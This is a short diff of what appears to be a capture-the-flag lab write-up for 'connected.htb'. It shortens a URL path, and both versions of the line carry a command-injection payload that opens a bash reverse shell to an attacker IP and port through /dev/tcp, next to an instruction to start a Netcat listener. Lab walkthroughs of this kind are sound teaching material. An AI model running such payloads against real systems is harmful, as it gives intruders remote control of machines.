@@ -33,7 +33,7 @@ A reverse shell is obtained by injecting a command through the `cmd` parameter.
 Example:
 
 ```text
-http://connected.htb/this-is-an-ioc-not-actually-watchTowr-pgbnd4yftm.php?cmd=bash+-c+'bash+-i+>&+/dev/tcp/<attacker_ip>/<listener_port>+0>&1'
+http://connected.htb/...?cmd=bash+-c+'bash+-i+>&+/dev/tcp/<attacker_ip>/<listener_port>+0>&1'
 ```
 
 Start a Netcat listener:
